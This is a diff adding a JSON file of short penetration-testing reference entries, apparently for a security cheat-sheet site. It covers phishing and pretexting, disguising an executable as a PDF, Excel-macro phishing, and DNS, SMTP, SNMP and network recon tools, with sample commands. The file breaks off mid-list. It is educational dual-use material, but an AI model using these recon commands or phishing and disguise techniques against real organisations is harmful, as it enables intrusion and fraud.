@@ -1,0 +1,1039 @@
+{
+  "Topics": [{
+      "Name": "Phishing",
+      "Tags": [
+        "Social Engineering"
+      ],
+      "Description": "Phishing is the criminally fraudulent process of attempting to acquire sensitive information such\nas usernames, passwords, and credit card details by masquerading as\na trustworthy entity in an electronic communication.",
+      "Description_HTML": "<p>Phishing is the criminally fraudulent process of attempting to acquire sensitive information such as usernames, passwords, and credit card details by masquerading as a trustworthy entity in an electronic communication.</p>"
+    },
+	{
+      "Name": "Elicitation",
+      "Tags": [
+        "Social Engineering"
+      ],
+	  "Description": "Elicitation is the process of extracting information from something or someone.\nElicitation can be used to know people better, making a social engineering attack more effective.",
+      "Description_HTML": "<p>Elicitation is the process of extracting information from something or someone.</p> <p>Elicitation can be used to know people better, making a social engineering attack more effective.</p>"
+    },
+	{
+      "Name": "Pretexting",
+	  
+      "Tags": [
+        "Social Engineering"
+      ],
+	  "Description": "Pretexting is a social engineering technique wherein a hacker uses false pretenses to engage with his/her\nintended victim in order to get information from that target.",
+      "Description_HTML": "<p>Pretexting is a social engineering technique wherein a hacker uses false pretenses to engage with his/her intended victim in order to get information from that target.</p>"
+    },
+	{
+      "Name": "Character Creation",
+      "Tags": [
+        "Social Engineering"
+      ],
+	  "Description": "Character Creation is important to make the story convincing and consistent. \nThe complexity of the character is determined by how much planning and depth is required.",
+      "Description_HTML": "<p>Character Creation is important to make the story convincing and consistent.</p> <p>The complexity of the character is determined by how much planning and depth is required.</p>"
+    },
+	{
+      "Name": "Gophish",
+      "Tags": [
+        "Social Engineering",
+		"Social Engineering Tools"
+      ],
+	  "Description": "Gophish is an open-source framework that makes testing an organizations exposure to phishing easily and effectively.\nThis tool allows you to set your targets, choose a template, and track the results in real time.\nMore can be found at https://getgophish.com",
+      "Description_HTML": "<p>Gophish is an open-source framework that makes testing an organizations exposure to phishing easily and effectively.</p> <p>This tool allows you to set your targets, choose a template, and track the results in real time.</p> <p>More can be found at https://getgophish.com</p>"
+    },
+	{
+      "Name": "Social Engineering Toolkit",
+      "Tags": [
+        "Social Engineering",
+		"Social Engineering Tools"
+      ],
+	  "Description": "Social Engineering Toolkit is an open-source pentesting framework designed to launch social engineering campaigns.\nThis tool has lots of custom attack vectors that make convincing phishing scenarios.\nSome attacks are:\n Spear-Phishing\nJava Applet Attack\nMetasploit Browser Exploit\nCredential Harvester\nTabnabbing Attack\nWeb Jacking Attack\nWireless-Attacks\nTo launch SET, type ./set\nMore info at: https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/",
+      "Description_HTML": "<p>Social Engineering Toolkit is an open-source pentesting framework designed to launch social engineering campaigns.</p> <p>This tool has lots of custom attack vectors that make convincing phishing scenarios.</p> <p>Some attacks are:</p> <p>Spear-Phishing</p> <p>Java Applet Attack</p> <p>Metasploit Browser Exploit</p> <p>Credential Harvester</p> <p>Tabnabbing Attack</p> <p>Web Jacking Attack</p> <p>Wireless-Attacks</p> <p>To launch SET, type ./set</p> <p>More info at: https://www.social-engineer.org/framework/se-tools/computer-based/social-engineer-toolkit-set/ </p>"
+    },
+	{
+      "Name": "Resource Hacker",
+      "Tags": [
+        "Social Engineering",
+		"Social Engineering Tools"
+      ],
+	  "Description" : "Resource Hacker is a tool that is used to edit components of any file.\n This is useful in social engineering attacks because you can make en exe look like a pdf by changing the file's image.",
+      "Description_HTML": "<p>Resource Hacker is a tool that is used to edit components of any file.</p> <p>This is useful in social engineering attacks because you can make en exe look like a pdf by changing the file's image.</p>"
+    },
+	{
+      "Name": "Excel Macros",
+      "Tags": [
+        "Social Engineering",
+		"Social Engineering Tools"
+      ],
+	  "Description" : "Macros can be made within Excel to execute programs, or execute Powershell commands.\nThis can be powerful in Phishing attacks where you can get users to open your malicious file.",
+      "Description_HTML": "<p>Macros can be made within Excel to execute programs, or execute Powershell commands.</p> <p>This can be powerful in Phishing attacks where you can get users to open your malicious file.</p>"
+    },
+	{
+    "Name": "theHarvester",
+    "Tags": [
+      "Passive Recon",
+      "Domain",
+      "Domain Tools"
+    ],
+    "Description": "theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual\nhosts, open ports/banners, and employee names from different public sources\n(search engines, pgp key servers).\nThis tool is helpful to gather information at the start of a PenTest (or hack)\nhttps://github.com/laramies/theHarvester",
+    "Description_HTML": "<p>theHarvester is a tool for gathering e-mail accounts, subdomain names, virtual hosts, open ports/banners, and employee names from different public sources (search engines, pgp key servers).</p> <p>This tool is helpful to gather information at the start of a PenTest (or hack) https://github.com/laramies/theHarvester</p>"
+  },
+    {
+      "Name": "Sublist3r",
+      "Tags": [
+        "Passive Recon",
+        "Domain",
+        "Domain Tools"
+      ],
+      "Description": "Sublist3r is similar to theHarvester, and is designed to enumerated subdomains of websites.\nIt enumerates the subdomains using search engines such as Google, Yahoo, Bing, Baidu, and Ask.\nIt also utilizes Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and Reverse DNS\nhttps://github.com/aboul3la/Sublist3r",
+      "Description_HTML": "<p>Sublist3r is similar to theHarvester, and is designed to enumerated subdomains of websites.</p> <p>It enumerates the subdomains using search engines such as Google, Yahoo, Bing, Baidu, and Ask.</p> <p>It also utilizes Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and Reverse DNS https://github.com/aboul3la/Sublist3r</p>"
+    },
+    {
+      "Name": "CheckUsernames",
+      "Tags": [
+        "Passive Recon",
+        "Tools"
+      ],
+      "Description": "CheckUsernames can be used to check the existence of any username across 160 Social Networking websites\nhttp://checkusernames.com/",
+      "Description_HTML": "<p>CheckUsernames can be used to check the existence of any username across 160 Social Networking websites http://checkusernames.com/</p>"
+    },
+    {
+      "Name": "Metadata",
+      "Tags": [
+        "Passive Recon",
+        "Tools"
+      ],
+      "Description": "Metadata can be used to identify relevant information regarding a corporation including locations, hardware, software, and\nmore.\nixquick http://ixquick.comn\nMetaCrawler http://metacrawler.com\nDogpile http://dogpile.com\nJeffery's Exif Viewer http://regex.info/exif.cgi\nMetagoofil http://www.edge-security.com/metagoofil.php",
+      "Description_HTML": "<p>Metadata can be used to identify relevant information regarding a corporation including locations, hardware, software, and more.</p> <p>ixquick http://ixquick.comn</p> <p>MetaCrawler http://metacrawler.com</p> <p>Dogpile http://dogpile.com</p> <p>Jeffery's Exif Viewer http://regex.info/exif.cgi Metagoofil http://www.edge-security.com/metagoofil.php </p>"
+    },
+    {
+      "Name": "GHDB",
+      "Tags": [
+        "Passive Recon",
+        "Tools"
+      ],
+      "Description": "Google Hacking Database utilizes Google's detailed search engine options to find very valuable information about a company,\nand can determine major vulnerabilities depending on the information that is found. GHDB can find anything from vulnerabilities, error messages\nplaintext passwords, usernames, login portals, sensitive documents, and much more!\nIt's important to note that it is not illegal to use DHDB, but it can be if you decide to click on something as a result of a search that displays\nsensitive information.\nhttp://www.hackersforcharity.org/ghdb/",
+      "Description_HTML": "<p>Google Hacking Database utilizes Google's detailed search engine options to find very valuable information about a company, and can determine major vulnerabilities depending on the information that is found. GHDB can find anything from vulnerabilities, error messages plaintext passwords, usernames, login portals, sensitive documents, and much more!</p> <p>It's important to note that it is not illegal to use DHDB, but it can be if you decide to click on something as a result of a search that displays sensitive information.</p> <p>http://www.hackersforcharity.org/ghdb/</p>"
+    },
+    {
+      "Name": "Shodan",
+      "Tags": [
+        "Passive Recon",
+        "Tools"
+      ],
+      "Description": "Shodan is a large search engine for any device that is reachable on the Internet. Shodan can be thought of as a portscan for the entire Internet!\nIt examines and documents the responses of the devices which can:\n-determine the target OS, or Web server software version\n-checks if the default username and password is being used\n-identify webcams, firewalls, network printers, and VoIP devices\nRegistration is required, and all activity is logged. Be careful as to what you click on resulting from a Shodan search; it can be traced to you!\nhttp://shodan.io",
+      "Description_HTML": "<p>Shodan is a large search engine for any device that is reachable on the Internet. Shodan can be thought of as a portscan for the entire Internet!</p> <p>It examines and documents the responses of the devices which can:</p> <p>-determine the target OS, or Web server software version</p> <p>-checks if the default username and password is being used</p> <p>-identify webcams, firewalls, network printers, and VoIP devices</p> <p>Registration is required, and all activity is logged. Be careful as to what you click on resulting from a Shodan search; it can be traced to you!</p> <p>http://shodan.io</p>"
+    },
+    {
+    "Name": "DNS Discovery",
+    "Tags": [
+      "Active Recon",
+      "DNS"
+    ],
+    "Description": "Performed through looking up WHOIS records for the Authoritative nameservers\nSubdomains of the main domain name should be checked and referenced with other domains under the target domain\nSublist3r is a recommended tool however is considered active recon as it's very noisy trying random subdomains.\nDNS Types are as follows:\n\n-A: Host's IP address\n-MX: Host/domain's mail exchanger(s)\n-NS: Host or domain's name server(s)\n-CNAME: Host's canonical name allowing additional names or aliases\n-SOA: Authority for the domain\n-SRV: Service location record often used with Session Initiation Protocol (SIP) and the Extensible Messaging Presence Protocol (XMPP)\n-RP: Responsible person\n-PTR: Pointer to a canonical name, used for reverse lookups.",
+    "Description_HTML": "<p>Performed through looking up WHOIS records for the Authoritative nameservers Subdomains of the main domain name should be checked and referenced with other domains under the target domain Sublist3r is a recommended tool however is considered active recon as it's very noisy trying random subdomains.</p><p>DNS Types are as follows:</p><p>-A: Host's IP address</p><p>-MX: Host/domain's mail exchanger(s)</p><p>-NS: Host or domain's name server(s)</p><p>-CNAME: Host's canonical name allowing additional names or aliases -SOA: Authority for the domain</p><p>-SRV: Service location record often used with Session Initiation Protocol (SIP) and the Extensible Messaging Presence Protocol (XMPP) -RP: Responsible person</p><p>-PTR: Pointer to a canonical name, used for reverse lookups.</p><img src='images/dns_record_types.jpg' class='img-responsive'></img><a href='https://www.cs.nmsu.edu/~istrnad/cs480/lecture_notes/dns_record_types.jpg'>Source</a>"
+  },
+    {
+      "Name": "Zone Transfering",
+      "Tags": [
+        "Active Recon",
+        "DNS"
+      ],
+      "Description": "Known as AXFR DNS zone transfers, are a type of DNS transaction. It's function is designed to replicate the databases containing DNS information across many DNS servers.\n Zone Transfering has two types:\n-AXFR: The mechanism for transfering information from a primary nameserver to a secondary DNS server.\nIXFR: The incrementation of a zones serial number for version control of the DNS databases, this allows for just the updates needed to be transferred to the lower DNS servers when versions are out of date.\nCommon tools used in Zone Transfering are:\n-host\n-dig\n-nmap",
+      "Description_HTML": "<p>Known as AXFR DNS zone transfers, are a type of DNS transaction. It's function is designed to replicate the databases containing DNS information across many DNS servers.</p><p>Zone Transfering has two types:</p><p>-AXFR: The mechanism for transfering information from a primary nameserver to a secondary DNS server.</p><p>IXFR: The incrementation of a zones serial number for version control of the DNS databases, this allows for just the updates needed to be transferred to the lower DNS servers when versions are out of date.</p><p>Common tools used in Zone Transfering are:</p><p>-host</p><p>-dig</p><p>-nmap</p>"
+    },
+    {
+      "Name": "Dig",
+      "Tags": [
+        "Active Recon",
+        "DNS",
+        "DNS Tools"
+      ],
+      "Description": "Dig is a DNS lookup utility which stands for 'Domain Information Groper'\nThe dig command has the following parameters:\ndig [@server] [-b address] [-c class] [-f filename] [-k filename] [-m] [-p port#] [-q name] [-t type] [-x addr] [-y [hmac:]name:key] [-4] [-6] [name] [type] [class] [queryopt...]\n Typical dig commands look like: dig @server name type so for example\nDigging google.com: dig @8.8.8.8 google.com\nDigging google.com MX records: dig @8.8.8.8 google.com MX\n Dig Reverse DNS Lookup: dig -x 216.58.220.110\n\nMore information: https://linux.die.net/man/1/dig",
+      "Description_HTML": "<p>Dig is a DNS lookup utility which stands for 'Domain Information Groper'</p><p>The dig command has the following parameters:</p><p>dig [@server] [-b address] [-c class] [-f filename] [-k filename] [-m] [-p port#] [-q name] [-t type] [-x addr] [-y [hmac:]name:key] [-4] [-6] [name] [type] [class] [queryopt...]</p> <p>Typical dig commands look like: dig @server name type so for example Digging google.com: dig @8.8.8.8 google.com</p><p>Digging google.com MX records: dig @8.8.8.8 google.com MX</p><p>Dig Reverse DNS Lookup: dig -x 216.58.220.110</p><p>More information: https://linux.die.net/man/1/dig</p>"
+    },
+    {
+      "Name": "Host",
+      "Tags": [
+        "Active Recon",
+        "DNS",
+        "DNS Tools"
+      ],
+      "Description": "Host is a DNS lookup utility typically used to convert names to IP addresses.\n The host command has the following parameters:\nhost [-aCdlnrsTwv] [-c class] [-N ndots] [-R number] [-t type] [-W wait] [-m flag] [-4] [-6] {name} [server]\nTypical host commands look like the following: host google.com\nhost 173.194.78.101\nDisplay MX records for a domain: host -n -t mx google.com\nFind domain name servers: host -t ns google.com\n\nMore information: https://linux.die.net/man/1/host",
+      "Description_HTML": "<p>Host is a DNS lookup utility typically used to convert names to IP addresses.</p><p>The host command has the following parameters:</p><p>host [-aCdlnrsTwv] [-c class] [-N ndots] [-R number] [-t type] [-W wait] [-m flag] [-4] [-6] {name} [server]</p> <p>Typical host commands look like the following: host google.com host 173.194.78.101</p><p>Display MX records for a domain: host -n -t mx google.com Find domain name servers: host -t ns google.com</p><p>More information: https://linux.die.net/man/1/host</p>"
+    },
+    {
+      "Name": "Fierce",
+      "Tags": [
+        "Active Recon",
+        "DNS",
+        "DNS Tools"
+      ],
+      "Description": "Fierce is a tool to be used to specifically locate likely targets inside and outside a corporate network. Fierce is a reconnaissance tool which quickly scans domains.\nThe fierce command has the following parameters: \nfierce [-connect] [-delay] [-dns] [-dnsfile] [-file] [-fulloutput] [-nopattern] [-range] [-search] [-traverse] [-wide] [-wordlist]\nA typical fierce scan would look like the following: fierce -dns google.com\n\nMore information: https://tools.kali.org/information-gathering/fierce",
+      "Description_HTML": "<p>Fierce is a tool to be used to specifically locate likely targets inside and outside a corporate network. Fierce is a reconnaissance tool which quickly scans domains.</p><p>The fierce command has the following parameters:</p><p>fierce [-connect] [-delay] [-dns] [-dnsfile] [-file] [-fulloutput] [-nopattern] [-range] [-search] [-traverse] [-wide] [-wordlist]</p> <p>A typical fierce scan would look like the following: fierce -dns google.com</p><p>More information: https://tools.kali.org/information-gathering/fierce</p>"
+    },
+    {
+      "Name": "Dnsenum",
+      "Tags": [
+        "Active Recon",
+        "DNS",
+        "DNS Tools"
+      ],
+      "Description": "Dnsenum is a tool used to enumerate DNS information to discover non-contiguous ip blocks.\n The dnsenum command has the following parameters:\ndnsenum [--dnsserver] [--enum] [--subfile <file>] [-t <value>] [--threads <value>] [-verbose] [-pages] [-scrap <value>] [--file <file>] [-u] [-r] [-w] [-e] [-o]\nA typical dnsenum command would look like the following:\ndnsenum --enum -f -r google.com\ndnsenum --noreverse -o mydomain.xml example.com\ndnsenum -h\n\nMore Information: https://tools.kali.org/information-gathering/dnsenum",
+      "Description_HTML": "<p>Dnsenum is a tool used to enumerate DNS information to discover non-contiguous ip blocks.</p><p>The dnsenum command has the following parameters:</p><p>dnsenum [--dnsserver] [--enum] [--subfile <file>] [-t <value>] [--threads <value>] [-verbose] [-pages] [-scrap <value>] [--file <file>] [-u] [-r] [-w] [-e] [-o]</p> <p>A typical dnsenum command would look like the following:</p><p>dnsenum --enum -f -r google.com</p><p>dnsenum --noreverse -o mydomain.xml example.com</p><p>dnsenum -h</p><p>More Information: https://tools.kali.org/information-gathering/dnsenum </p>"
+    },
+    {
+      "Name": "Dnsrecon",
+      "Tags": [
+        "Active Recon",
+        "DNS",
+        "DNS Tools"
+      ],
+      "Description": "Dns recon is a tool used to do many things such as check all NS records for Zone transfers, Enumerate General DNS Records for for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT), perform SRV Record Enumeration, Brute Force subdomain and host A and AAAA records, and much more.\nDnsrecon has the following parameters:\ndnsrecon [-h] [-d] [-r] [-n] [-D] [-f] [-t <type>]\nA typical dnsrecon command looks like:\ndnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml\ndnsrecon -d <google.com> -a\ndnsrecon  -r <startIP>-<endIP>\ndnsrecon  -d <domain> -s\n\nMore Informationo: https://tools.kali.org/information-gathering/dnsrecon",
+      "Description_HTML": "<p>Dns recon is a tool used to do many things such as check all NS records for Zone transfers, Enumerate General DNS Records for for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT), perform SRV Record Enumeration, Brute Force subdomain and host A and AAAA records, and much more.</p><p>Dnsrecon has the following parameters:</p><p>dnsrecon [-h] [-d] [-r] [-n] [-D] [-f] [-t <type>]</p><p>A typical dnsrecon command looks like:</p><p>dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml dnsrecon -d <google.com> -a</p><p>dnsrecon  -r <startIP>-<endIP></p><p>dnsrecon  -d <domain> -s</p><p>More Informationo: https://tools.kali.org/information-gathering/dnsrecon </p>"
+    },
+    {
+      "Name": "Reverse DNS",
+      "Tags": [
+        "Active Recon",
+        "DNS"
+      ],
+      "Description": "Used to obtain valid server names currently in use within an organization. However the DNS server must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address.\nReverse DNS uses a provided IP address to query a DNS server for the domain name associated with the provided IP address.",
+      "Description_HTML": "<p>Used to obtain valid server names currently in use within an organization. However the DNS server must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address.</p> <p>Reverse DNS uses a provided IP address to query a DNS server for the domain name associated with the provided IP address.</p>"
+    },
+    {
+      "Name": "Forward DNS",
+      "Tags": [
+        "Active Recon",
+        "DNS"
+      ],
+      "Description": "Known as 'DNS Bruteforcing' uses a domain name to map IP addresses, essentially the opposite of Reverse DNS. This allows the discovery of additional host names that are not commonly known within networks.\nAvailable tools are:\n-Fierce\n-Dnsenum\n-Dnsrecon\n-Sublist3r",
+      "Description_HTML": "<p>Known as 'DNS Bruteforcing' uses a domain name to map IP addresses, essentially the opposite of Reverse DNS.</p> <p>This allows the discovery of additional host names that are not commonly known within networks.</p> <p>Available tools are:</p> <p>-Fierce</p> <p>-Dnsenum</p> <p>-Dnsrecon</p> <p>-Sublist3r</p>"
+    },
+    {
+      "Name": "SMTP",
+      "Tags": [
+        "Active Recon",
+        "SMTP"
+      ],
+      "Description": "Simple Mail Transfer Protocol on TCP port 25, generally used to be sent to relay mail servers to while using somethign like IMAP or POP3 to receive messages (TCP Port 587 Typically).\n Known tools for SMTP:\n-smtp-userenum\n-smtpscan\n-swaks *Swiss Army Knife for SMTP*\n-smtp-enum-users",
+      "Description_HTML": "<p>Simple Mail Transfer Protocol on TCP port 25, generally used to be sent to relay mail servers to while using somethign like IMAP or POP3 to receive messages (TCP Port 587 Typically).</p> <p>Known tools for SMTP:</p> <p>-smtp-userenum</p> <p>-smtpscan</p> <p>-swaks *Swiss Army Knife for SMTP*</p> <p>-smtp-enum-users</p><img src='images/smtp.png' class='img-responsive'></img><a href='https://networkwolves.files.wordpress.com/2015/03/what-is-smtp.png'>Source</a>"
+    },
+    {
+      "Name": "SMTP Bounce Back",
+      "Tags": [
+        "Active Recon",
+        "SMTP"
+      ],
+      "Description": "Known as a Non-Delivery Report/Receipt, failed Delivery Status Notification (DSN) message, Non-Delivery Notification (NDN), or a bounce is an automated messaged from a mail system informing the sender of a message about a delivery problem.\nCan be generated by referencing bogus addresses within a target's domain.",
+      "Description_HTML": "<p>Known as a Non-Delivery Report/Receipt, failed Delivery Status Notification (DSN) message, Non-Delivery Notification (NDN), or a bounce is an automated messaged from a mail system informing the sender of a message about a delivery problem.</p> <p>Can be generated by referencing bogus addresses within a target's domain.</p>"
+    },
+    {
+      "Name": "SMTP Open Relay",
+      "Tags": [
+        "Active Recon",
+        "SMTP"
+      ],
+      "Description": "An SMTP server that will deliver on behalf of any domain without requiring authentication. Abused by spammers to send mass amounts of spam through systems.\nThese servers are perfect for sending forged emails through which are less likely to be caught by spam filters with organization addresses.\n Useful relay scanning tool: -ORFinder",
+      "Description_HTML": "<p>An SMTP server that will deliver on behalf of any domain without requiring authentication. Abused by spammers to send mass amounts of spam through systems.</p> <p>These servers are perfect for sending forged emails through which are less likely to be caught by spam filters with organization addresses.</p> <p>Useful relay scanning tool: -ORFinder</p>"
+    },
+    {
+      "Name": "smtp-user-enum",
+      "Tags": [
+        "Active Recon",
+        "SMTP",
+        "SMTP Tools"
+      ],
+      "Description": "smtp-user-enum is a tool for enumerating OS-level user accounts via the SMTP service. Enumeration is performed by inspecting responses to VRFY, EXPN, and RCPT TO commands.\nsmtp-user-enum has the following parameters:\nsmtp-user-enum [-m] [-M] [-u] [-f] [-D] [-U] [-t <host>] [-T <file>] [-p <port>] [-d] [-t <n>]\nA typical smtp-user-enum commands looks like:\nsmtp-user-enum -h\nsmtp-user-enum -M VRFY -u root -t 192.168.1.25\n\nMore Information: https://tools.kali.org/information-gathering/smtp-user-enum",
+      "Description_HTML": "<p>smtp-user-enum is a tool for enumerating OS-level user accounts via the SMTP service. Enumeration is performed by inspecting responses to VRFY, EXPN, and RCPT TO commands.</p> <p>smtp-user-enum has the following parameters:</p> <p>smtp-user-enum [-m] [-M] [-u] [-f] [-D] [-U] [-t <host>] [-T <file>] [-p <port>] [-d] [-t]</p> <p>A typical smtp-user-enum commands looks like:</p> <p>smtp-user-enum -h</p> <p>smtp-user-enum -M VRFY -u root -t 192.168.1.25</p> <p>More Information: https://tools.kali.org/information-gathering/smtp-user-enum </p>"
+    },
+    {
+      "Name": "smtpscan",
+      "Tags": [
+        "Active Recon",
+        "SMTP",
+        "SMTP Tools"
+      ],
+      "Description": "Smtpscan is a remote SMTP server version detector, it can be used to make a logical guess on which SMTP version the target server is running using test commands.\nSmtpscan has the following parameters:\n smtpscan [-h] [-V] [-v] [-d] [-f] [-t] [-p] [-i] [-c] [-D] [-n] [-a]\nA typical Smtpscan command looks like:\nsmtpscan google.com\nsmtpscan smtp1.google.com smtp2.google.com\nsmtpscan -D google.com\n\nMore information: http://www.linuxcertif.com/man/1/smtpscan/",
+      "Description_HTML": "<p>Smtpscan is a remote SMTP server version detector, it can be used to make a logical guess on which SMTP version the target server is running using test commands.</p> <p>Smtpscan has the following parameters:</p> <p>smtpscan [-h] [-V] [-v] [-d] [-f] [-t] [-p] [-i] [-c] [-D] [-n] [-a]</p> <p>A typical Smtpscan command looks like:</p> <p>smtpscan google.com</p> <p>smtpscan smtp1.google.com smtp2.google.com</p> <p>smtpscan -D google.com</p> <p>More information: http://www.linuxcertif.com/man/1/smtpscan/ </p>"
+    },
+    {
+      "Name": "swaks",
+      "Tags": [
+        "Active Recon",
+        "SMTP",
+        "SMTP Tools"
+      ],
+      "Description": "swaks - Swiss Army Knife SMTP is a flexible transaction-oriented SMTP test tool. Swaks handles SMTP features and extensions like TLS, authentication, and pilplining. Supports multiple versions of the protocol including:\n-SMTP\n-ESMTP\n-LMTP\nswaks has the following parameters:\n swaks [--to] [--server] [--from] [--auth] [--auth-user] [--header] [--attach] [--body] [--socket]\nA typical swaks command looks like:\nswaks --to user@example.com --server test-server.example.net\nswaks --to user@example.com --body /path/to/gtube/file\n\nMore information: http://www.jetmore.org/john/code/swaks/latest/doc/ref.txt",
+      "Description_HTML": "<p>swaks - Swiss Army Knife SMTP is a flexible transaction-oriented SMTP test tool. Swaks handles SMTP features and extensions like TLS, authentication, and pilplining. Supports multiple versions of the protocol including: -SMTP</p> <p>-ESMTP</p> <p>-LMTP</p> <p>swaks has the following parameters:</p> <p>swaks [--to] [--server] [--from] [--auth] [--auth-user] [--header] [--attach] [--body] [--socket]</p> <p>A typical swaks command looks like:</p> <p>swaks --to user@example.com --server test-server.example.net swaks --to user@example.com --body /path/to/gtube/file More information: http://www.jetmore.org/john/code/swaks/latest/doc/ref.txt </p>"
+    },
+    {
+      "Name": "Banner Grabbing",
+      "Tags": [
+        "Active Recon",
+        "Banner Information"
+      ],
+      "Description": "Enumeration technique used to glean information about computer systems on a network, and services running on open ports. We can use this to identify versions of applications, operating systems, and other things on a target host.\n Typicallyperformed over: HTTP, FTP, and SMTP\n Tools used:\n-Telnet\n-Nmap\n-Curl\n-Netcat",
+      "Description_HTML": "<p>Enumeration technique used to glean information about computer systems on a network, and services running on open ports. We can use this to identify versions of applications, operating systems, and other things on a target host.</p> <p>Typicallyperformed over: HTTP, FTP, and SMTP Tools used:</p> <p>-Telnet</p> <p>-Nmap</p> <p>-Curl</p> <p>-Netcat</p><img src='images/banner-grabbing.png' class='img-responsive'></img><a href='https://www.information-security.fr/wp-content/uploads/2014/11/banner-grabbing-02.png'>Source</a>"
+    },
+    {
+      "Name": "SNMP Sweeps",
+      "Tags": [
+        "Active Recon",
+        "SNMP"
+      ],
+      "Description": "SNMP: Simple Network Management Protocol, gives a vast amount of information about specific system. SNMP is a stateless, diagram oriented protocol much like UDP. SNMPv1 authentication uses a secret, mutually known string known as the community string to authenticate the service:\n-Done over plaintext\n-Default community string is typically 'public' or 'community'\nIt's worth noting that newer versions do not use plaintext transport.\nSNMP servers will not respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports.\nTherefore no response from a probed IP address can mean the following:\n-Machine unreachable\n-SNMP server not running\n-Invalid Community String\n-Response datagram has not arrived yet",
+      "Description_HTML": "<p>SNMP: Simple Network Management Protocol, gives a vast amount of information about specific system. SNMP is a stateless, diagram oriented protocol much like UDP. SNMPv1 authentication uses a secret, mutually known string known as the community string to authenticate the service: -Done over plaintext</p> <p>-Default community string is typically 'public' or 'community'</p> <p>It's worth noting that newer versions do not use plaintext transport.</p> <p>SNMP servers will not respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports.</p> <p>Therefore no response from a probed IP address can mean the following: -Machine unreachable</p> <p>-SNMP server not running</p> <p>-Invalid Community String</p> <p>-Response datagram has not arrived yet</p>"
+    },
+    {
+      "Name": "SNMP Polling",
+      "Tags": [
+        "Active Recon",
+        "SNMP"
+      ],
+      "Description": "We can poll the following information via SNMP:\n-Computer name\n-Logged in users\n-Number of processes\n-Owners of processes\n-Patch levels (Uncommon)\n-Resource usage",
+      "Description_HTML": "We can poll the following information via SNMP:<br />-Computer name<br />-Logged in users<br />-Number of processes<br />-Owners of processes<br />-Patch levels (Uncommon)<br />-Resource usage"
+    },
+    {
+      "Name": "Server Message Block",
+      "Tags": [
+        "Active Recon",
+        "Windows"
+      ],
+      "Description": "Windows clients connect to Windows servers using CIFS (common Internet filesystem protocol) & SMB (Server Message Block) protocols to share files, access printers, etc.\n CIFS supersedes SMB adding additional access control mechanisms, file, and disk management techniques.\nBoth run on TCP ports 139 and 445.\nFour main SMB protocol versions exist which are the following:\n-SMB 1.0\n-SMB 2.0\n-SMB 2.1\n-SMB 3.0\nNMAP is a great tool for SMB scanning as it can use it's network propagation functionality to mass scan networks for information and running services with open ports.\nHelpful tools that can be used are:\n SMBTouch",
+      "Description_HTML": "<p>Windows clients connect to Windows servers using CIFS (common Internet filesystem protocol) & SMB (Server Message Block) protocols to share files, access printers, etc.</p> <p>CIFS supersedes SMB adding additional access control mechanisms, file, and disk management techniques.</p> <p>Both run on TCP ports 139 and 445.</p> <p>Four main SMB protocol versions exist which are the following:</p> <p>-SMB 1.0</p> <p>-SMB 2.0</p> <p>-SMB 2.1</p> <p>-SMB 3.0</p> <p>NMAP is a great tool for SMB scanning as it can use it's network propagation functionality to mass scan networks for information and running services with open ports.</p> <p>Helpful tools that can be used are:</p> <p>SMBTouch</p>"
+    },
+    {
+      "Name": "PowerSploit",
+      "Tags": [
+        "Active Recon",
+        "Windows",
+        "Windows Tools"
+      ],
+      "Description": "Powersploit is a collection of PowerShell scripts used in post-exploitation scenarios. You can view these tools in Kali by default by entering:\nls -l /usr/share/powersploit/\n\nMore information: https://tools.kali.org/maintaining-access/powersploit",
+      "Description_HTML": "Powersploit is a collection of PowerShell scripts used in post-exploitation scenarios. You can view these tools in Kali by default by entering:\nls -l /usr/share/powersploit/<br /><br />More information: https://tools.kali.org/maintaining-access/powersploit"
+    },
+    {
+      "Name": "Active Directory Recon",
+      "Tags": [
+        "Active Recon",
+        "Windows",
+        "Active Directory"
+      ],
+      "Description": "With direct access to a domain, tons of information can be gathered through AD.\nMost recon through active directory is performed using PowerShell\nActive Directory also supports standard LDAP queries over TCP 389 which require no special privileges, and if on a domain you will have full access.\nTools used in AD Recon:\n-Powersploit\n-windapsearch *LDAP-specific*",
+      "Description_HTML": "<p>With direct access to a domain, tons of information can be gathered through AD.</p> <p>Most recon through active directory is performed using PowerShell Active Directory also supports standard LDAP queries over TCP 389 which require no special privileges, and if on a domain you will have full access.</p> <p>Tools used in AD Recon:</p> <p>-Powersploit</p> <p>-windapsearch *LDAP-specific*</p><img src='images/active-directory.gif' class='img-responsive'></img><a href='https://i-technet.sec.s-msft.com/dynimg/IC196825.gif'>Source</a>"
+    },
+    {
+      "Name": "Network Device Enumeration",
+      "Tags": [
+        "Active Recon",
+        "Network"
+      ],
+      "Description": "Network Device Enumeration allows for host discovery on a target network, we can use this to enumerate live hosts and network hops on a LAN or WAN.\n Many hosts will often not reply to these queries because of firewall locality and OS firewalls.\n Techniques used for Network Scanning are:\n-ICMP Scan\n-ARP Scan\n-Traceroute scan\n\nTools used for Network Enumeration are:\n-Nmap\n-Traceroute\n-Netdiscover",
+      "Description_HTML": "<p>Network Device Enumeration allows for host discovery on a target network, we can use this to enumerate live hosts and network hops on a LAN or WAN.</p> <p>Many hosts will often not reply to these queries because of firewall locality and OS firewalls.</p> <p>Techniques used for Network Scanning are: -ICMP Scan</p> <p>-ARP Scan</p> <p>-Traceroute scan</p> <p>Tools used for Network Enumeration are: -Nmap</p> <p>-Traceroute</p> <p>-Netdiscover</p>"
+    },
+    {
+      "Name": "Network Device Enumeration",
+      "Tags": [
+        "Active Recon",
+        "Network",
+        "Network Tools"
+      ],
+      "Description": "Netdiscover is used for scanning hosts generally over Layer 2 but generally is an active/passive scanner for networks without a DHCP server.\nNetdiscover has the following parameters:\nnetdiscover [-i device] [-r range | -p] [-s time] [-n node] [-c count] [-f] [-S]\nA typical netdiscover command looks like the following:\nnetdiscover -I eth0 -r 192.168.100.0/24\nMore information: https://github.com/alexxy/netdiscover",
